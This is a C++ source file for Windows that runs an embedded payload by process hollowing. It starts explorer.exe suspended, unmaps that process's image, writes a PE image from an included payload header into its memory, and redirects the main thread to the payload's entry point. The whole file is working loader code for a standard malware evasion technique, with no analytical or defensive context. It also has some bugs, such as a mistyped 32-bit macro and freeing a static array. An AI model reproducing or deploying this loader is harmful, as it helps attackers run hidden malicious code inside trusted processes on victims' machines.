#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include "payload.h"

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

char* Local_PATH = (char*)"C:\\Windows\\explorer.exe";



void RunPE()
{

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = {};

    if (CreateProcessA(Local_PATH, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
     
    
        LPBYTE FileImage = rawData;
      

        PIMAGE_DOS_HEADER pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(FileImage + pDosHeaders->e_lfanew);
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        PVOID RemoteImageBase = NULL;
#ifdef _WIN64
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
#endif
#ifdef _WIN32_
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &RemoteImageBase, sizeof(PVOID), NULL);
#endif

      
        pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
        if ((SIZE_T)RemoteImageBase == pNtHeaders->OptionalHeader.ImageBase)
        {
            NtUnmapViewOfSection(pi.hProcess, RemoteImageBase);
        }

     
        PVOID RemoteProcessMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

      
        PIMAGE_SECTION_HEADER pSectionHeaders = IMAGE_FIRST_SECTION(pNtHeaders);
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
        {
            WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders[i].VirtualAddress), (PVOID)(FileImage + pSectionHeaders[i].PointerToRawData), pSectionHeaders[i].SizeOfRawData, NULL);
        }


        ctx.ContextFlags = CONTEXT_FULL;
#ifdef _WIN64
        ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif
#ifdef _WIN32_
        ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif


        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);

   
        delete[] FileImage;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{

    RunPE();
    return 0;
}